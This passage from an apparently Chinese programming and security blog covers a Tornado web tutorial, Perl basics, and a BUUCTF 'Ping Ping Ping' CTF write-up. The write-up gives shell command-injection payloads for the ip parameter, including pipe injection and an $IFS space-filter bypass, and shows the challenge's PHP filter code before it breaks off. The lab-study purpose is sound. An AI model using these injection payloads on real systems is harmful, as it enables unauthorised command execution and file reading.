tornado.ioloop <span class="keyword">import</span> IOLoop</span><br><span class="line"><span class="keyword">from</span> tornado.httpserver <span class="keyword">import</span> HTTPServer</span><br><span class="line"><span class="keyword">from</span> tornado.options <span class="keyword">import</span> options,define</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;port&quot;</span>, default=<span class="number">8000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span>(<span class="params">RequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">       self.write(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+self.reverse_url(<span class="string">&quot;login&quot;</span>)+<span class="string">&quot;&#x27;&gt;用户登录&lt;/a&gt;&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegistHandler</span>(<span class="params">RequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">initialize</span>(<span class="params">self, title</span>):</span></span><br><span class="line">       self.title = title</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">       self.write(<span class="string">&quot;注册业务处理:&quot;</span> + <span class="built_in">str</span>(self.title))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span>(<span class="params">RequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">       self.write(<span class="string">&quot;用户登录页面展示&quot;</span>)</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self</span>):</span></span><br><span class="line">      self.write(<span class="string">&quot;用户登录功能处理&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   app = Application( <span class="comment"># 设置URL解析弩兵工厂</span></span><br><span class="line">       [</span><br><span class="line">           (<span class="string">r&quot;/&quot;</span>, IndexHandler), <span class="comment"># 名称设置</span></span><br><span class="line">           (<span class="string">r&quot;/regist&quot;</span>, RegistHandler, &#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;会员注册&quot;</span>&#125;),</span><br><span class="line">           url(<span class="string">r&quot;/login&quot;</span>, LoginHandler, name=<span class="string">&quot;login&quot;</span>), <span class="comment"># </span></span><br><span class="line">       ]</span><br><span class="line">   )</span><br><span class="line"></span><br><span class="line">   http_server = HTTPServer(app)</span><br><span class="line">   http_server.listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line">   IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<h1 id="设置响应头"><a href="#设置响应头" class="headerlink" title="设置响应头"></a>设置响应头</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> Application, RequestHandler</span><br><span class="line"><span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop</span><br><span class="line"><span class="keyword">from</span> tornado.options <span class="keyword">import</span> options, define</span><br><span class="line">define(<span class="string">&quot;port&quot;</span>, default=<span class="number">8000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span>(<span class="params">RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_default_headers</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 第二种响应头设置方式</span></span><br><span class="line">        print(<span class="string">&quot;---------&gt; 响应头set_default_headers()执行&quot;</span>)</span><br><span class="line">        self.set_header(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>)</span><br><span class="line">        self.set_header(<span class="string">&quot;js&quot;</span>, <span class="string">&quot;zj&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 第一种操作响应头的方式：</span></span><br><span class="line">        <span class="comment"># self.set_header(&quot;Content-type&quot;, &quot;application/json&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;----------&gt;get方法执行&quot;</span>)</span><br><span class="line">        self.write(<span class="string">&quot;&#123;&#x27;简书&#x27;:&#x27;知几&#x27;&#125;&quot;</span>)</span><br><span class="line">        self.set_header(<span class="string">&quot;jianshu&quot;</span>, <span class="string">&quot;zhiji&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = Application([(<span class="string">r&quot;/&quot;</span>, IndexHandler)])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> Application, RequestHandler</span><br><span class="line"><span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop</span><br><span class="line"><span class="keyword">from</span> tornado.options <span class="keyword">import</span> options, define</span><br><span class="line">define(<span class="string">&quot;port&quot;</span>, default=<span class="number">8000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span>(<span class="params">RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.write(<span class="string">&quot;hello jianshu.com&quot;</span>)</span><br><span class="line">        self.set_cookie(<span class="string">&quot;loginuser&quot;</span>, <span class="string">&quot;admin&quot;</span>) <span class="comment"># 设置cookie</span></span><br><span class="line">        <span class="built_in">print</span> self.get_cookie(<span class="string">&quot;loginuser&quot;</span>) <span class="comment"># 获取并打印cookie</span></span><br><span class="line">        <span class="built_in">print</span> self.cookies <span class="comment"># 获取所有cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = Application([(<span class="string">r&quot;/&quot;</span>, IndexHandler)])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    IOLoop.current().start()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/02/DEV-python-tornado/" data-id="ckluk74e9000lmkus469rbcgl" data-title="DEV-python-tornado" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dev/" rel="tag">dev</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DEV-perl" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/01/DEV-perl/" class="article-date">
  <time class="dt-published" datetime="2021-03-01T00:38:53.000Z" itemprop="datePublished">2021-03-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/01/DEV-perl/">dev-perl</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>参考：<a target="_blank" rel="noopener" href="https://qntm.org/perl_cn">https://qntm.org/perl_cn</a></p>
<h1 id="helloworld-pl"><a href="#helloworld-pl" class="headerlink" title="helloworld.pl"></a>helloworld.pl</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">print &quot;Hello world&quot;;</span><br></pre></td></tr></table></figure>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="Scalar变量"><a href="#Scalar变量" class="headerlink" title="Scalar变量"></a>Scalar变量</h2><p>undef，数值，字符串，其他变量的引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my $num &#x3D; 4040.5;</span><br></pre></td></tr></table></figure>
<h2 id="布尔变量"><a href="#布尔变量" class="headerlink" title="布尔变量"></a>布尔变量</h2><p>未明显定义布尔变量</p>
<h2 id="Array变量"><a href="#Array变量" class="headerlink" title="Array变量"></a>Array变量</h2><p>元素为scalar</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> @array = (</span><br><span class="line">	<span class="string">&quot;print&quot;</span>,</span><br><span class="line">	<span class="string">&quot;these&quot;</span>,</span><br><span class="line">	<span class="string">&quot;strings&quot;</span>,</span><br><span class="line">	<span class="string">&quot;out&quot;</span>,</span><br><span class="line">	<span class="string">&quot;for&quot;</span>,</span><br><span class="line">	<span class="string">&quot;me&quot;</span>, <span class="comment"># 末尾多余的逗号语法上是允许的</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">print</span> $array[<span class="number">0</span>]; <span class="comment"># &quot;print&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="修改函数"><a href="#修改函数" class="headerlink" title="修改函数"></a>修改函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop</span><br><span class="line">push</span><br><span class="line">shift</span><br><span class="line">unshift</span><br><span class="line">join</span><br><span class="line">reverse</span><br><span class="line">map</span><br><span class="line">grep</span><br><span class="line">cmp</span><br></pre></td></tr></table></figure>


<h2 id="Hash变量"><a href="#Hash变量" class="headerlink" title="Hash变量"></a>Hash变量</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> %scientists = (</span><br><span class="line">	<span class="string">&quot;Newton&quot;</span>   =&gt; <span class="string">&quot;Isaac&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Einstein&quot;</span> =&gt; <span class="string">&quot;Albert&quot;</span>,</span><br><span class="line">	<span class="string">&quot;Darwin&quot;</span>   =&gt; <span class="string">&quot;Charles&quot;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="list变量"><a href="#list变量" class="headerlink" title="list变量"></a>list变量</h2><p>元素为scalar</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">	<span class="string">&quot;print&quot;</span>,</span><br><span class="line">	<span class="string">&quot;these&quot;</span>,</span><br><span class="line">	<span class="string">&quot;strings&quot;</span>,</span><br><span class="line">	<span class="string">&quot;out&quot;</span>,</span><br><span class="line">	<span class="string">&quot;for&quot;</span>,</span><br><span class="line">	<span class="string">&quot;me&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h1 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> @array = <span class="string">&quot;Mendeleev&quot;</span>; <span class="comment"># 与&#x27;my @array = (&quot;Mendeleev&quot;);&#x27;等价</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $scalar = (<span class="string">&quot;Alpha&quot;</span>, <span class="string">&quot;Beta&quot;</span>, <span class="string">&quot;Gamma&quot;</span>, <span class="string">&quot;Pie&quot;</span>); <span class="comment"># $scalar的值现在是&quot;Pie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> @array = (<span class="string">&quot;Alpha&quot;</span>, <span class="string">&quot;Beta&quot;</span>, <span class="string">&quot;Gamma&quot;</span>, <span class="string">&quot;Pie&quot;</span>);</span><br><span class="line"><span class="keyword">my</span> $scalar = @array; <span class="comment"># $scalar的值现在是4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> @array = (<span class="string">&quot;Alpha&quot;</span>, <span class="string">&quot;Beta&quot;</span>, <span class="string">&quot;Goo&quot;</span>);</span><br><span class="line"><span class="keyword">my</span> $scalar = <span class="string">&quot;-X-&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> @array;              <span class="comment"># &quot;AlphaBetaGoo&quot;;</span></span><br><span class="line"><span class="keyword">print</span> $scalar, @array, <span class="number">98</span>; <span class="comment"># &quot;-X-AlphaBetaGoo98&quot;;</span></span><br></pre></td></tr></table></figure>
<h1 id="引用嵌套"><a href="#引用嵌套" class="headerlink" title="引用嵌套"></a>引用嵌套</h1><p>array和list不能包含scalar以外的元素</p>
<p>scalar元素可以作为array或list的引用（使用反斜杠）</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> @outer = (<span class="string">&quot;Sun&quot;</span>, <span class="string">&quot;Mercury&quot;</span>, <span class="string">&quot;Venus&quot;</span>, <span class="keyword">undef</span>, <span class="string">&quot;Mars&quot;</span>);</span><br><span class="line"><span class="keyword">my</span> @inner = (<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Moon&quot;</span>);</span><br><span class="line">$outer[<span class="number">3</span>] = @inner;</span><br><span class="line"><span class="keyword">print</span> $outer[<span class="number">3</span>]; <span class="comment"># &quot;2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $colour;         <span class="comment"># &quot;Indigo&quot;</span></span><br><span class="line"><span class="keyword">print</span> $scalarRef;      <span class="comment"># 输出可能是 &quot;SCALAR(0x182c180)&quot;</span></span><br><span class="line"><span class="keyword">print</span> $&#123; $scalarRef &#125;; <span class="comment"># &quot;Indigo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> @colours = (<span class="string">&quot;Red&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Yellow&quot;</span>, <span class="string">&quot;Green&quot;</span>, <span class="string">&quot;Blue&quot;</span>);</span><br><span class="line"><span class="keyword">my</span> $arrayRef = \@colours;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $colours[<span class="number">0</span>];       <span class="comment"># 直接访问array元素</span></span><br><span class="line"><span class="keyword">print</span> $&#123; $arrayRef &#125;[<span class="number">0</span>]; <span class="comment"># 通过引用访问array元素</span></span><br><span class="line"><span class="keyword">print</span> $arrayRef-&gt;[<span class="number">0</span>];    <span class="comment"># 与上一句等价</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> %atomicWeights = (<span class="string">&quot;Hydrogen&quot;</span> =&gt; <span class="number">1.008</span>, <span class="string">&quot;Helium&quot;</span> =&gt; <span class="number">4.003</span>, <span class="string">&quot;Manganese&quot;</span> =&gt; <span class="number">54.94</span>);</span><br><span class="line"><span class="keyword">my</span> $hashRef = \%atomicWeights;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $atomicWeights&#123;<span class="string">&quot;Helium&quot;</span>&#125;; <span class="comment"># 直接访问hash元素</span></span><br><span class="line"><span class="keyword">print</span> $&#123; $hashRef &#125;&#123;<span class="string">&quot;Helium&quot;</span>&#125;;  <span class="comment"># 通过引用访问hash元素</span></span><br><span class="line"><span class="keyword">print</span> $hashRef-&gt;&#123;<span class="string">&quot;Helium&quot;</span>&#125;;     <span class="comment"># 与上一句等价 - 这种写法相当常见</span></span><br></pre></td></tr></table></figure>
<h1 id="条件分支和循环"><a href="#条件分支和循环" class="headerlink" title="条件分支和循环"></a>条件分支和循环</h1><p>if…elsif…else</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">my $word &#x3D; &quot;antidisestablishmentarianism&quot;;</span><br><span class="line">my $strlen &#x3D; length $word;</span><br><span class="line"></span><br><span class="line">if($strlen &gt;&#x3D; 15) &#123;</span><br><span class="line">	print &quot;&#39;&quot;, $word, &quot;&#39; is a very long word&quot;;</span><br><span class="line">&#125; elsif(10 &lt;&#x3D; $strlen &amp;&amp; $strlen &lt; 15) &#123;</span><br><span class="line">	print &quot;&#39;&quot;, $word, &quot;&#39; is a medium-length word&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	print &quot;&#39;&quot;, $word, &quot;&#39; is a short word&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;&#39;&quot;, $word, &quot;&#39; is actually enormous&quot; if $strlen &gt;&#x3D; 20;</span><br></pre></td></tr></table></figure>
<p>unless…else…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Oh no it&#39;s too cold&quot; unless $temperature &gt; 15;</span><br></pre></td></tr></table></figure>
<p>?:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my $lost &#x3D; 1;</span><br><span class="line">print &quot;You lost &quot;, $lost, &quot; t&quot;, ($lost &#x3D;&#x3D; 1 ? &quot;oo&quot; : &quot;ee&quot;), &quot;th!&quot;;</span><br></pre></td></tr></table></figure>
<p>while</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">while($i &lt; scalar @array) &#123;</span><br><span class="line">	print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">	$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>until</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">until($i &gt;&#x3D; scalar @array) &#123;</span><br><span class="line">	print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">	$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>do</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">do &#123;</span><br><span class="line">	print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">	$i++;</span><br><span class="line">&#125; while ($i &lt; scalar @array);</span><br><span class="line"></span><br><span class="line">my $i &#x3D; 0;</span><br><span class="line">do &#123;</span><br><span class="line">	print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">	$i++;</span><br><span class="line">&#125; until ($i &gt;&#x3D; scalar @array);</span><br></pre></td></tr></table></figure>
<p>foreach</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $i &#x3D; 0;</span><br><span class="line">do &#123;</span><br><span class="line">	print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">	$i++;</span><br><span class="line">&#125; until ($i &gt;&#x3D; scalar @array);</span><br></pre></td></tr></table></figure>
<p>range</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach my $i ( 0 .. $#array ) &#123;</span><br><span class="line">	print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>next last</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CANDIDATE: for my $candidate ( 2 .. 100 ) &#123;</span><br><span class="line">	for my $divisor ( 2 .. sqrt $candidate ) &#123;</span><br><span class="line">		next CANDIDATE if $candidate % $divisor &#x3D;&#x3D; 0;</span><br><span class="line">	&#125;</span><br><span class="line">	print $candidate.&quot; is prime\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="自定义程序"><a href="#自定义程序" class="headerlink" title="自定义程序"></a>自定义程序</h1><p>sub声明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub hyphenate &#123;</span><br><span class="line"></span><br><span class="line">  # 从array中取出第一个参数，忽略其他</span><br><span class="line">  my $word &#x3D; shift @_;</span><br><span class="line"></span><br><span class="line">  # 聪明过头的list comprehension</span><br><span class="line">  $word &#x3D; join &quot;-&quot;, map &#123; substr $word, $_, 1 &#125; (0 .. (length $word) - 1);</span><br><span class="line">  return $word;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print hyphenate(&quot;exterminate&quot;); # &quot;e-x-t-e-r-m-i-n-a-t-e&quot;</span><br></pre></td></tr></table></figure>
<h2 id="参数引用"><a href="#参数引用" class="headerlink" title="参数引用"></a>参数引用</h2><p>@_表名，第一个参数为$<em>[0]，第二个为$\</em>[1]</p>
<h1 id="文件句柄"><a href="#文件句柄" class="headerlink" title="文件句柄"></a>文件句柄</h1><p>open，模式&lt;表示想要读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my $f &#x3D; &quot;text.txt&quot;;</span><br><span class="line">my $result &#x3D; open my $fh, &quot;&lt;&quot;, $f;</span><br><span class="line"></span><br><span class="line">if(!$result) &#123;</span><br><span class="line">	die &quot;Couldn&#39;t open &#39;&quot;.$f.&quot;&#39; for reading because: &quot;.$!;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="ARGV"><a href="#ARGV" class="headerlink" title="ARGV"></a>ARGV</h1><p>用于获取命令行输入的参数，常用此进行命令注入</p>
<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/11/24/Perl%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://www.mi1k7ea.com/2020/11/24/Perl%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/01/DEV-perl/" data-id="ckluk74e7000fmkushh83b8km" data-title="dev-perl" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dev/" rel="tag">dev</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-BUUCTF-Web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/28/CTF-wp-BUUCTF-Web/" class="article-date">
  <time class="dt-published" datetime="2021-02-28T02:29:10.000Z" itemprop="datePublished">2021-02-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/28/CTF-wp-BUUCTF-Web/">CTF-wp-BUUCTF Web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>来源： GXYCTF2019</p>
<p>考察：RCE，空格绕过</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
<p>页面提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;</span><br></pre></td></tr></table></figure>
<p>故在URL处设置ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
<p>有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br><span class="line">?ip&#x3D;127.0.0.1|cat flag.php </span><br><span class="line">?ip&#x3D;127.0.0.1|flag.php</span><br></pre></td></tr></table></figure>
<p>有过滤</p>
<p>fuzz一下，发现{}这些都被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else 